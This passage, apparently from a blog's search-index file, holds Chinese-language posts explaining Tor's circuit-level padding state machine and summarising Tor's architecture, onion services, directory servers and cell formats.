style="zoom:67%;" /><p><code>circuit-level padding</code>由<code>Client</code>和<code>Middle</code>互相发送和接收<code>Padding cell</code>, 这里它们用于发送<code>Padding cell</code>的程序视为一个状态机, 称为<code>Padding Machine</code></p><p>此种<code>Padding cell</code>的<code>Command</code>字段值为<strong>3</strong>(<code>RELAY</code>), <code>Relay Command</code>的值为10(<code>Drop</code>) ,对于只能在在<code>Entry</code>处观察到Tor cell的前3字节的攻击者来说, 此种cell和一般的Tor cell无异.</p><p><br><br></p><h2 id="2-1PADDING协商"><a href="#2-1PADDING协商" class="headerlink" title="2.1PADDING协商"></a>2.1PADDING协商</h2><p>执行<code>circuit-level padding</code>的是部署在<code>Client</code>和<code>middle</code>上的<strong>padding状态机</strong></p><p>在进行padding之前, 需要通过发送携带特殊的<code>Relay Command</code>字段值(**41&#x2F;42)**的<code>RELAY cell</code>来进行PADDING协商:</p><img src="/images/tor-padding/1.png" alt="padding_relay_cell" style="zoom:67%;" /><p>分别是由padding的发起方发送的<code>PADDING_NEGOTIATE_cell</code>(41)和由响应方发送的<code>PADDING_NEGOTIATED_cell</code>(42)</p><p>其中,请求方发送的<code>PADDING_NEGOTIATE_cell</code>的payload中包含以下内容:(下面的结构体struct)</p><img src="/images/tor-padding/2.png" alt="PADDING_NEGOTIATE_cell_payload" style="zoom:67%;" /><p>其中各个字段:</p><ul><li><p>command &#x3D; <code>「CIRCPAD_COMMAND_START」(2)</code></p></li><li><p>machine_type &#x3D; <code>「CIRCPAD_MACHINE_CIRC_SETUP」(1)</code> <strong>此值用于标记发送它的是发起padding的一方</strong></p></li><li><p>michine_ctr : 当前链路上<code>machine instance</code>的数量, 用于消除关闭请求的歧义,如果该字段不符合事实,那么请求将被忽略</p><br></li></ul><p>当接收方收到<code>PADDING_NEGOTIATE_cell</code>时, 首先检查请求方请求的<code>version</code>等自己是否支持, 然后发送<code>PADDING_NEGOTIATED_cell</code>,其payload包含以下内容:</p><img src="/images/tor-padding/3.png" alt="PADDING_NEGOTIATED_cell_payload" style="zoom:67%;" /><p>在收到<code>PADDING_NEGOTIATE_cell</code>之前, <code>Client</code>就可以开始发送<code>Padding cell</code>了</p><p><br><br></p><h2 id="2-2对IPO链路的混淆"><a href="#2-2对IPO链路的混淆" class="headerlink" title="2.2对IPO链路的混淆"></a>2.2对IPO链路的混淆</h2><blockquote><p>tor中,访问互联网网站(非<code>HS</code>)的通信,cell序列一般遵循以下模式: <strong>创建三跳链路 - 请求服务 - 交互应用数据</strong></p><p>([DATA]表示由<code>Client</code>发送给<code>Server</code>的Cell, DATA相反方向的Cell), padding机制需要尽可能把<code>IPO</code>和<code>RPO</code>链路上的cell序列伪装成此种模式:</p><img src="/images/tor-padding/4.png" alt="Normal Circuit" style="zoom:67%;" /></blockquote><p>一般来说, <code>IPO</code>链路上的Cell序列表现为:</p><img src="/images/tor-padding/5.png" alt="IPO circuit" style="zoom: 80%;" /><p>和一般链路对比可以看出, 前面通过<code>RELAY_EXTEND cell</code>建立链路的阶段是相似的, 主要需要将<code>[INTRO1]</code>和<code>[INTRODUCE_ACK]</code>这里混淆成这种形式: </p><img src="/images/tor-padding/6.png" alt="DATA" style="zoom: 80%;" /><p>在<code>[INTRO1]</code>和<code>[INTRODUCE_ACK]</code>之间发送<code>PADDING_NEGOTIATE_cell</code>和<code>PADDING_NEGOTIATED_cell</code>进行padding协商:</p><img src="/images/tor-padding/7.png" alt="NEGOTIATE" style="zoom: 80%;" /><p>在此之后, <code>Middle</code>会给<code>Client</code>发送7-10个<code>Padding cell</code>(<strong>RELAY_drop</strong>), 以模拟正常通信中服务器发回数据的过程</p><p><br><br></p><h2 id="2-3对RPO链路的混淆"><a href="#2-3对RPO链路的混淆" class="headerlink" title="2.3对RPO链路的混淆"></a>2.3对RPO链路的混淆</h2><p><code>RPO</code>链路的混淆目标也是一般的Tor三跳链路:</p><img src="/images/tor-padding/4.png" alt="Normal Circuit" style="zoom:67%;" /><p>一般来说, <code>RPO</code>链路上的Cell序列表现为:</p><img src="/images/tor-padding/8.png" alt="RPO Circuit" style="zoom: 80%;" /><p>添加<code>Padding cell</code>(<strong>DROP</strong>)后:(前面提过,<code>client</code>在收到<code>PADDING_NEGOTIATED_cell</code>之前就能开始发送<code>Padding cell</code>)</p><img src="/images/tor-padding/9.png" alt="RPO PADDING Circuit" style="zoom: 80%;" /><p>在此之后,由<code>RPO</code>方向正常传回来自于<code>HS</code>的应用数据即可(不再需要<code>Padding cell</code>)</p><p>因为当<code>RPO</code>链路完全建立完成时,链路上会有来自隐藏服务器端的应用数据,对于无法看到payload的攻击者来说,来自<code>HS</code>的正常cell和<code>Padding cell</code>没有区别,因此此时padding可以停止.</p><p><br><br></p><h2 id="2-4Padding-Machine的工作机制"><a href="#2-4Padding-Machine的工作机制" class="headerlink" title="2.4Padding Machine的工作机制"></a>2.4Padding Machine的工作机制</h2><p><code>Padding Machine</code>是一种状态机, 工作时根据实际情况在不同状态之间进行转换</p><p>首先定义数据流有两种状态:<code>Burst</code>和<code>gap</code></p><img src="/images/tor-padding/10.png" alt="Burst and Gap" style="zoom: 80%;" /><ul><li><code>Burst</code> : 一段在短时间内集中发送的数据包序列(数据包的密度较大),,此时<code>Padding Machine</code>处于<code>burst mode</code>, padding的需求较小, 在发送<code>Padding cell</code>之前需等待更长的时延.</li><li><code>Gap</code> :一段时间跨度较长的数据包序列(数据包的密度较小),此时链路上的流模式特征性更强, 很可能被攻击者记录并分析, 因此padding的需求较大,<code>Padding Machine</code>处于<code>gap mode</code>,仅等待较短的时延后就可以发送<code>Padding cell</code>.</li></ul><br><p>每个<code>Padding Machine</code>都会保存两个直方图<code>HG</code>和<code>HB</code>分别用于在<code>gap mode</code>和<code>burst mode</code>下选择合适的发送<code>Padding cell</code>的等待时延:</p><img src="/images/tor-padding/11.png" alt="Histogram" style="zoom: 80%;" /><p>其横轴为时延值, 纵轴为<code>Tokens</code>, 表示在某个时延范围(<code>Bin</code>)中选择一个合适的具体时延值的可能性</p><br><p><code>Padding Machine</code>的状态转移示意:(其中的S,B,G分别表示其实状态,<code>burst mode</code> 和<code>gap mode</code>)</p><img src="/images/tor-padding/12.png" alt="Histogram" style="zoom: 80%;" /><ul><li><strong>burst mode:</strong></li></ul><p>在起始状态(S)下,<code>client</code>正不断接收从服务器发回的真实数据,此时进入<code>burst mode</code>, 系统根据<code>HB</code>(<code>burst mode</code>对应的直方图)所给出的概率分布来选择一个发送时延<code>t</code> (此直方图是根据分析大量网络流量而形成的)(来自上一个<code>burst</code>的结束和下一个<code>burst</code>的开始之间的时间差的取样)</p><p>当此节点不断地处理真实数据包,系统会不断地根据<code>HB</code>来选择新的发送时延,不断重复, 系统会停留在<code>burst mode</code></p><p>如果在时延<code>t</code>的范围内没有处理到真实数据包,那么<code>Padding cell</code>将被发送,系统进入<code>gap mode</code></p><p>综上,在<code>burst mode</code>期间,如果发现了一个大于所选延时<code>t</code>的<code>IAT(inter-arrival time)</code> ,那么当前选择的延时<code>t</code>将失效,并且触发<code>gap mode</code></p> <br><ul><li><strong>gap mode:</strong></li></ul><p>在,通过<code>HG</code>来选择一个时延<code>t&#39;</code>,并且在时延结束时发送<code>Padding cell</code>, <code>HG</code>同样是通过对大量站点流量中<code>burst</code>内的<code>IAT(inter-arrival time)</code>取样来构建的(这是为了模拟正常<code>burst</code>中的<code>IAT</code>)</p><p>当接收到一个真实的数据包,或者在<code>HG</code>中选择到了一个来自<code>infinity bin</code>(上上图中最右侧的那个bin)范围中的时延值</p><p>此时系统会从<code>gap mode</code>转向<code>burst mode</code></p> <br><p>当在<code>burst mode</code>中,当从<code>HB</code>中选择到了一个来自<code>infinity bin</code>范围之中的时延值时,转向起始状态(S) (这种情况说明根据真实流量取样时,选择到了一个较大的<code>IAT</code>值,说明真实的通信双方当前已经停止通信或者处于其他数据包极其稀疏的阶段)</p><p>综上可知, Padding机制不会影响对真实的数据包的处理或转发(不应用时延), 处理一个真实的数据包意味着当前选择的时延值失效,</p><p>此时还会进行的操作: 在<code>HB</code>或<code>HG</code>中将<code>Token</code>返还给当前失效的时延值对应的<code>Bin</code>,并且从真实时延值对应的<code>Bin</code>处移除一个<code>Token</code>, 以此来校正分布</p><p>个人理解:如果收到真实数据包导致时延值失效,那么当前失效的时延值肯定大于收到这个包和收到上个包之间的<code>IAT</code>(也就是当前真实的时延),这说明当前仍处在频繁收到真实包的阶段,<strong>选择一个时延值时会”暂时拿走”一个其对应<code>Bin</code>的<code>Token</code></strong>,此时如果不校正的话,高时延<code>Bin</code>的<code>Token</code>减少了一个,那么下次选择时,选择到更低时延的<code>Bin</code>的可能性会增加,多次循环后,可能会导致系统倾向选择到极低的时延值,导致在<code>burst mode</code>还没来得及接收真实数据包,就进入了<code>gap mode</code>,最终导致真假数据包混合.  因此,校正操作是归还之前”暂时拿走”的<code>Token</code>,并移除一个更短的真实时延对应<code>Bin</code>的<code>Token</code>, 那么下次选择就不会趋向于选择更短时延的<code>Token</code></p><p>如果一个<code>Bin</code>的<code>Token</code>耗尽,那么在移除时会移除与之相邻的更大<code>Bin</code>的<code>Token</code></p><p>如果所有<code>Bin</code>的<code>Token</code>都耗尽,那么<code>HB</code>或者<code>HG</code>返回初始状态</p><p><br><br></p>]]></content>
      
      
      <categories>
          
          <category> Tor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TOR原理的不完全总结</title>
      <link href="/post/75310f08.html"/>
      <url>/post/75310f08.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-啥是Tor"><a href="#0-啥是Tor" class="headerlink" title="0_啥是Tor"></a>0_啥是Tor</h1><blockquote><p>Tor(<strong>The Onion Router,直译:洋葱路由器</strong>) 是用于实现匿名通信的软件, 是目前应用范围最广的匿名通信系统, 是通常所讲的「暗网」所依赖的底层技术. Tor本质上是为了保护用户的身份和访问内容等隐私信息而诞生的技术, 不仅可以用来访问暗网网站(域名一般以<code>.onion</code>结尾), 也可以用来访问普通的网站.</p><br><p>Tor网络是由分布在全球各地的由志愿者提供的中继节点组成的.  之所以叫做「洋葱」路由器, 是因为Tor对隐私的保护主要是通过「<strong>多层加密</strong>」和「<strong>多跳代理</strong>」来实现的, 当一个用户需要接入Tor网络时, 客户端会通过特殊算法选择若干组, 每一组共三个节点分别作为<code>入口节点(Guard Relay)</code>,  <code>中间节点(Middle Relay)</code>和<code>出口节点(Exit Relay)</code>来构成一条<code>Tor链路(circuit)</code>.  当用户使用浏览器访问了<code>www.google.com</code> 这样的普通网站时, 他的请求数据包会在本地进行多层加密后发送到一条<code>Tor链路(circuit)</code>上,   这个数据包接下来会依次被转发到<code>入口节点(Guard Relay)</code>,  <code>中间节点(Middle Relay)</code>和<code>出口节点(Exit Relay)</code>, 每到一个节点, 这个数据包就会被进行一层解密, 这个过程就像<strong>剥洋葱</strong>一样. 当数据在<code>出口节点(Exit Relay)</code>剥下最后一层洋葱皮后, <code>出口节点(Exit Relay)</code>就得到了明文的请求包, 然后它再去访问<code>www.google.com</code>的服务器. 服务器返回响应的过程也与此类似, 数据同样会在经过链路上的各个节点时经历一个「剥洋葱」的过程. </p><br><p>从上面的过程里就能够看出: 一个不怀好意的攻击者无论在链路上的任何一个位置截获数据包, 他都无法<strong>同时知道通信双方的身份以及通信的内容</strong>.  当然,前面也只是用户访问一个普通的互联网网站的过程. 如果这个用户在浏览器中输入的是URL以<code>.onion</code>结尾的暗网网站, 通信的过程还会更加复杂, 不仅仅是客户端, 另外一边的暗网服务器也会建立一个三条的链路, 然后服务器的链路和客户端的链路再通过一个称为<code>汇聚节点(RPO)</code>的路由器沟通. 这个多出来过程主要是为了保护暗网服务器的匿名性.</p></blockquote><br><p>想要访问暗网, 最简单的办法就是谷歌搜索Tor官网并下载Tor浏览器, 现在安装好浏览器之后的配置基本上都是傻瓜式的了. 不过在国内由于墙的存在, 大部分能够接入Tor网络的节点都被封锁了, 即使偶尔运气好能够连接上也是速度感人.  想体验的话一般还要先挂梯子或者使用Tor官方提供的网桥.. 当然,没有研究技术原理之类的特殊需求的话还是不要去尝试了.</p><img src="/images/tor-spec/image-20220819104351867.png" alt="image-20220819104351867" style="zoom:67%;" /><br><hr><br><h1 id="1-Tor的简要结构和工作流程"><a href="#1-Tor的简要结构和工作流程" class="headerlink" title="1_Tor的简要结构和工作流程"></a>1_Tor的简要结构和工作流程</h1><p><strong>(简单了解的话只看这一部分就行啦)</strong></p><img src="/images/tor-spec/1.png" alt="Tor网络的简单结构(出自:「匿名通信与暗网研究综述」罗军舟等)" style="zoom:67%;" /><h2 id="1-1组件介绍"><a href="#1-1组件介绍" class="headerlink" title="1.1组件介绍"></a><span style="font-size:25px;font-weight:bold">1.1组件介绍</span></h2><ul><li><code>客户端Client</code>:  <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Client) </span>用户电脑上安装的本地程序(<strong>例如Tor浏览器</strong>), 将用户上网的数据封装成<code>Tor cell</code>并层层加密后发送出去.</li><li><code>洋葱路由器Onion Router</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称OR)</span> 由志愿者和官方提供的中继节点.  Tor的默认链路由三跳节点组成,分别为<code>入口节点Guard Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Entry)</span>, <code>中间节点Middle Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Middle)</span>和<code>出口节点Exit Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Exit)</span>. 其中<code>Entry</code>一般是可信度较高的守护节点.</li><li><code>隐藏服务器Hidden Server</code>: <span style='color:black;background:yellow;font-family:hei'><strong>(后面简称HS)</strong></span> 提供隐藏服务的服务器(简单来说就是那些暗网网站的服务器),必须使用Tor客户端接入Tor网络之后才能够访问到.</li><li><code>目录服务器Directory Server</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称DS)</span> 保存了所有<code>OR</code>的IP地址,带宽等信息. <code>Client</code>首次启动时要向其请求这些信息, 以便完成节点的选择和链路的建立.</li><li><code>隐藏服务目录服务器Hidden Service Directory</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称HSD)</span> 存储并向<code>client</code>提供<code>HS</code>的<code>引入节点IPO</code>和公钥等信息.</li><li><code>引入节点Introduction Point</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称IPO)</span> 由<code>HS</code>来选择的具有特殊功能的<code>OR</code>. 一个<code>HS</code>在开始接入Tor网络时, 就会选择三个<code>OR</code>来充当它的<code>IPO</code>, 并与这些<code>IPO</code>分别建立三跳的一般Tor链路. 当某个<code>Client</code>需要连接此<code>HS</code>时,<code>Client</code>会首先从<code>HSD</code>处取得同一个<code>HS</code>关联的<code>IPO</code>的信息, 并把这个<code>IPO</code>视为一个一般的服务器来与其建立三跳链路, 通过这条链路来发送关于<strong>客户端选择的<code>RPO</code>的信息</strong>以及同<code>HS</code>的<code>握手数据</code>. 这些数据会经由<code>IPO</code>中转给<code>HS</code>. </li><li><code>汇聚节点Rendezvous Point</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称RPO)</span> 由<code>Client</code>来选择的具有特殊功能的<code>OR</code>, 当一个<code>Client</code>需要连接某个<code>HS</code>时, 它会选择一个<code>OR</code>作为自己同<code>HS</code>的通信链路的汇聚点并与其建立三跳链路, <code>Client</code>将这个节点, 也就是<code>RPO</code>的信息通过<code>HS</code>的<code>IPO</code>告知给<code>HS</code>, 然后<code>HS</code>也会向<code>RPO</code>建立三跳链路. 由此形成的六跳链路就是最终<code>Client</code>和<code>HS</code>通信的链路.</li></ul><br><br><h2 id="1-2三跳访问的过程-用于访问一般的互联网网站"><a href="#1-2三跳访问的过程-用于访问一般的互联网网站" class="headerlink" title="1.2三跳访问的过程(用于访问一般的互联网网站)"></a><span style="font-size:25px;font-weight:bold">1.2三跳访问的过程(用于访问一般的互联网网站)</span></h2><img src="/images/tor-spec/2.png" alt="" style="zoom: 67%;" /><div align='center' style='font-family:hei;font-weight:bold'>    (Tor Client访问"维基百科"的过程)  </div><ol><li>用户开启了<code>Client</code>, <code>Client</code> 向<code>DS</code>请求当前活跃的<code>OR</code>的IP, 带宽等信息.</li><li><code>Client</code>通过 <span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold'>基于加权随机的路由选择算法</span> 来选择三个<code>OR</code>并建立三跳链路 (建立三跳链路的详细过程见<a href="#part_4">后面的”建立连接”部分</a>)</li><li>访问数据在<code>Client</code>处被加密3次并发送给<code>Entry</code><span style='font-family:hei;font-weight:bold'>(这三次只是Tor对访问数据的加密,事实上Tor算是应用层的协议, 而这些数据按照计网的五层架构向下封装时, 还会被TLS等常见协议进行加密, 如果算上这个的话, 数据其实是被加密了4次的)</span></li><li>访问数据在三个节点处各进行一次解密, 最后<code>Exit</code>解密获得明文数据, 得知这些数据是用来访问 “维基百科” 的, 并获得这个服务器的IP和端口, <code>Exit</code>就会去同 “维基百科” 的服务器建立HTTP连接并发起访问.</li><li>服务器返回的数据在依次经过<code>Exit</code>,<code>Middle</code>,<code>Entry</code>的过程中会被它们使用各自同<code>Client</code>协商好的会话密钥层层加密,这样到达<code>Client</code>的数据又是经过了三层加密的「完整洋葱」, <code>Client</code>再使用自己的多个密钥对其进行依次解密.</li></ol><br><br><h2 id="1-3六跳访问的过程-用于访问暗网网站"><a href="#1-3六跳访问的过程-用于访问暗网网站" class="headerlink" title="1.3六跳访问的过程(用于访问暗网网站)"></a><span id= "part_1.3" style="font-size:25px;font-weight:bold">1.3六跳访问的过程(用于访问暗网网站)</span></h2><ol><li><code>HS</code>在选择三个<code>OR</code>作为自己的<code>IPO</code>, 并分别同它们建立三跳链路.</li><li><code>HS</code>将自己的<strong>服务描述符</strong>上传到<code>HSD</code>, <strong>服务描述符</strong>的内容包括自己<code>IPO</code>的信息和 <code>RSA公钥</code>.</li><li><code>Client</code>通过<code>HS</code>的域名<code>###.onion</code>进行访问时, 首先通过一个三跳链路访问<code>HSD</code>, 请求这个<code>HS</code>的<code>IPO</code>的信息和 <code>RSA公钥</code>.</li><li><code>Client</code>选择一个<code>OR</code>作为自己的<code>RPO</code>, 并与其建立三跳链路.</li><li><code>Client</code>建立到<code>IPO</code>的三跳链路, 并通过它将自己的<code>RPO</code>的信息以及<code>握手数据</code>发送给<code>IPO</code>, <code>IPO</code>再将这些信息发送给<code>HS</code>.</li><li><code>HS</code>建立到<code>RPO</code>的三跳链路, 并对此链路进行认证, 同时通过<code>RPO</code>向<code>Client</code>响应自己的<code>握手信息</code>.</li><li>至此, <code>Client</code>和<code>HS</code>可以通过这条由<code>RPO</code>沟通的六跳链路进行通信</li></ol><br><hr><br><h1 id="2-Tor网络组成结构的细节补充"><a href="#2-Tor网络组成结构的细节补充" class="headerlink" title="2_Tor网络组成结构的细节补充"></a>2_Tor网络组成结构的细节补充</h1><h2 id="2-1目录服务器DS"><a href="#2-1目录服务器DS" class="headerlink" title="2.1目录服务器DS"></a>2.1目录服务器DS</h2><img src="/images/tor-spec/3.png" alt="哪些服务器可以充当DS" style="zoom: 67%;" /><div align='center' style='font-family:hei;font-weight:bold'>    (哪些服务器可以充当DS,来自官方文档)  </div><p><span style='font-family:hei;font-weight:bold'>DS可以包括:</span></p><ul><li>权威的目录服务器,共9个,公开.</li><li>网桥目录服务器,匿名.</li><li>目录服务器的镜像(由一些普通的<code>OR</code>来充当),功能和权威的目录服务器一样,公开.</li><li>洋葱服务的目录服务器,也就是<code>HSD</code>,匿名</li></ul><br><p><span style='font-family:hei;font-weight:bold'>DS保存的内容包括:</span></p><ul><li>共识文档(consensus document): 当前Tor网络中每个<code>OR</code>的简要信息.</li><li>服务描述符(server descriptor): 当前Tor网络中每个<code>OR</code>的详细信息,包括公钥等.</li><li>额外信息(extra-info): 包括每个OR的补充信息 (例如历史时间戳等) .</li></ul><blockquote><p>前面提到<a href="#jiaquanluyou">Client使用加权路由选择算法来选择OR</a>依据的文件就是<code>共识文档(consensus document)</code>和<code>服务描述符(server descriptor)</code>, Client依据这两个文件提供的带宽信息和放缩因子计算各节点的加权值并按照<code>exit</code>,<code>entry</code>,<code>middle</code>的顺序选择节点 链路上任意两个节点应来自不同的c类网段</p></blockquote><p>每个<code>OR</code>都会签署和更新自己的<code>服务描述符(server descriptor)</code>,并每18小时将其上传到9个半信任的<strong>权威目录服务器</strong>中的每一个..</p><p>然后这些<strong>权威的目录服务器</strong>会整合自己已知的所有<code>OR</code>的信息并形成一个<code>共识文档(consensus document)</code>. 9个<strong>权威目录服务器</strong>之间会根据特定算法相互交流, 最后形成一致的<code>共识文档(consensus document)</code>, 并各自对其签名.</p><p>活跃的<code>OR</code>或者接入Tor网络的<code>Client</code>每个小时从<strong>权威目录服务器或者其镜像处</strong>下载一次<code>共识文档(consensus document)</code>(有时只下载发生变化的部分) 和过期的<code>服务描述符(server descriptor)</code></p><p><code>DS</code>是公开的, 允许<code>OR</code>或<code>Client</code>通过直连链路, 以<strong>HTTP</strong>的方式请求服务.</p><br><br><h2 id="2-2隐藏服务目录服务器HSD"><a href="#2-2隐藏服务目录服务器HSD" class="headerlink" title="2.2隐藏服务目录服务器HSD"></a>2.2隐藏服务目录服务器HSD</h2><p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold'><code>HSD</code>并不是传统的中央服务器结构,而是DHT(分布式哈希表)结构</span></p><blockquote><img src="/images/tor-spec/4.png" alt="分布式哈希表"  /></blockquote><img src="/images/tor-spec/5.png" alt="分布式哈希表(出自:「匿名通信与暗网研究综述」罗军舟等)" style="zoom:67%;" /><p>Tor网络中的<code>HSD</code>是由一系列稳定快速且可信的<code>OR</code>来组成的DHT结构. 这些<code>OR</code>在<code>DS</code>保存的<code>共识文档(consensus document)</code>中拥有特殊的flag标记.</p><p><code>Client</code>通过要访问的URL:<code>&quot;###.onion&quot;</code>可以提取计算出该服务器的相关数据在哈希环上的存储位置, 然后去请求该位置上的<code>HSD</code>节点</p><br><hr><br><h1 id="3-Tor-cell"><a href="#3-Tor-cell" class="headerlink" title="3_Tor cell"></a>3_Tor cell</h1><h2 id="3-1结构"><a href="#3-1结构" class="headerlink" title="3.1结构"></a>3.1结构</h2><p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold;font-size:25px'>Tor cell是Tor协议下通信的基本数据单元</span></p><img src="/images/tor-spec/6.png" alt="Tor cell的基本结构" style="zoom:67%;" /><p>其中, <code>Command</code>字段指示这个Tor cell要执行的功能, 其长度固定为1字节.</p><p><code>Circuit ID</code>字段用于确认此Tor cell和哪一条Tor链路相关联</p><p>在Tor version1-3中, <code>Circuit ID</code>字段的长度为2字节, 这样以来, 一个Tor cell的大小固定为<strong>512字节</strong>.</p><p>在Tor version4之后, <code>Circuit ID</code>字段的长度为4字节, 一个Tor cell的大小固定为<strong>514字节</strong>.</p><p>一般来说, 如果一个Tor cell的长度不足, 则在payload部分进行填充, 直到这个cell的大小达到固定的512或者514字节</p><p>也有一部分特殊的Tor cell (由几个特殊的Command字段值来标识, 该值为<strong>7或者大于128</strong>) 大小是可变的</p><br><h2 id="3-2Command字段的值和相关含义"><a href="#3-2Command字段的值和相关含义" class="headerlink" title="3.2Command字段的值和相关含义:"></a><span id="jiaquanluyou" style='font-family:hei;font-weight:bold;font-size:25px'>3.2Command字段的值和相关含义:</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">长度固定的Tor cell可以使用的Command值:</span><br><span class="line">    0 -- PADDING     (Padding)         </span><br><span class="line">用于链路的keep alive, 如果当前没有其他流量,则Client和OR之间或者OR和OR之间每隔一段时间就要发送PADDING cells              1 -- CREATE      (Create a circuit)   用于Client创建链路    </span><br><span class="line">    2 -- CREATED     (Acknowledge create)     用于响应确认CREATE cell</span><br><span class="line">    3 -- RELAY       (End-to-end data)        最常见,用于传输数据</span><br><span class="line">    4 -- DESTROY     (Stop using a circuit)   </span><br><span class="line">    5 -- CREATE_FAST (Create a circuit, no PK) </span><br><span class="line">    6 -- CREATED_FAST (Circuit created, no PK) </span><br><span class="line">    8 -- NETINFO     (Time and address info)   </span><br><span class="line">    9 -- RELAY_EARLY (End-to-end data; limited)</span><br><span class="line">    10 -- CREATE2    (Extended CREATE cell)    </span><br><span class="line">    11 -- CREATED2   (Extended CREATED cell)   </span><br><span class="line">    12 -- PADDING_NEGOTIATE   (Padding negotiation)</span><br><span class="line">    </span><br><span class="line">长度可变的Tor cell可以使用的Command值:</span><br><span class="line">    7 -- VERSIONS    (Negotiate proto version) </span><br><span class="line">    128 -- VPADDING  (Variable-length padding) </span><br><span class="line">    129 -- CERTS     (Certificates)           </span><br><span class="line">    130 -- AUTH_CHALLENGE (Challenge value)    </span><br><span class="line">    131 -- AUTHENTICATE (Client authentication)</span><br><span class="line">    132 -- AUTHORIZE (Client authorization)    (Not yet used)</span><br></pre></td></tr></table></figure><p><strong>根据<code>Command</code>字段的值不同, 字节填充的模式也不同, 例如:</strong></p><ul><li>7(VERSION): payload中不能包含任何额外的填充字节</li><li>3&#x2F;9(RELAY&#x2F;RELAY_EARLY): 填充的字节为随机值</li><li>132(AUTHORIZE): 没有使用, 如何设置填充字节也没有指明</li><li>其他固定长度的Tor cell: 填充字节设为<code>NUL</code></li><li>其他可变长度的Tor cell: 填充字节设为<code>NUL</code></li></ul><p><br><br></p><h2 id="3-3CREATE-D-x2F-CREATE-D-2-cell"><a href="#3-3CREATE-D-x2F-CREATE-D-2-cell" class="headerlink" title="3.3CREATE(D)&#x2F;CREATE(D)2 cell"></a><span id="3.3" style="font-size:25px;font-weight:bold">3.3CREATE(D)&#x2F;CREATE(D)2 cell</span></h2><p>这部分开始是<a href="#part_4">第四部分建立链路过程的补充知识</a></p><p><code>CREATE(D)/CREATE(D)2 cell</code>一般用于相邻的两个节点之间用于建立链路的通信, 例如<code>Client</code>和<code>Entry</code>, <code>Entry</code>和<code>Middle</code>等等</p><p><code>CREATE(D)2</code>是<code>CREATE(D)</code>的更新版本, 其格式是可扩充的</p><p><code>CREATE2 cell</code>是由<strong>握手的发起方</strong>发送的, 其<strong>payload</strong>包含以下内容: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTYPE     (Client Handshake Type)     [2 bytes] 握手类型</span><br><span class="line">HLEN      (Client Handshake Data Len) [2 bytes] 握手数据长度</span><br><span class="line">HDATA     (Client Handshake Data)     [HLEN bytes] 握手数据</span><br></pre></td></tr></table></figure><p><code>CREATED2 cell</code>是由<strong>握手的响应方</strong>发送的, 其<strong>payload</strong>包含以下内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HLEN      (Server Handshake Data Len) [2 bytes] 握手数据长度</span><br><span class="line">HDATA     (Server Handshake Data)     [HLEN bytes] 握手数据</span><br></pre></td></tr></table></figure><br><p>其中<code>HTYPE</code>指示的握手类型包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000  TAP  -- the original Tor handshake;</span><br><span class="line">0x0001  reserved</span><br><span class="line">0x0002  ntor -- the ntor+curve25519+sha256 handshake;</span><br></pre></td></tr></table></figure><p><br><br></p><h2 id="3-4RELAY-cell"><a href="#3-4RELAY-cell" class="headerlink" title="3.4RELAY cell"></a>3.4RELAY cell</h2><p><code>REALY cell</code>用于端到端 (end to end) 的通信</p><p><code>Client</code>可以向链路上的任何<code>OR</code>或服务器发送<code>REALY cell</code>, 其payload会使用每个途中经过的<code>OR</code>的会话密钥进行层层加密, 只有此cell的接收者才能最终解密得到明文的payload. </p><p>结构: (<strong>其中灰色部分是该<code>RELAY cell</code>的接收者才能最终解密看见的内容</strong>)</p><img id= "RELAY_cell" src="/images/tor-spec/8.png" alt="relay cell的基本结构" style="zoom:80%;" /><p>上图中可以看见, 除了Tor cell本身的 <code>Command</code>命令字段之外, <code>RELAY cell</code>内部还有一个自己的命令字段</p><p>其中,<code>STREAM ID</code>字段值一般由<code>Client</code>来选择, 通常是非0值, 如果该值为0,那么该流被视为是”控制流”,即能够对整条链路的数据传输产生影响</p><p><span id= "relay_command"><code>Relay Command</code>字段值一览:</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 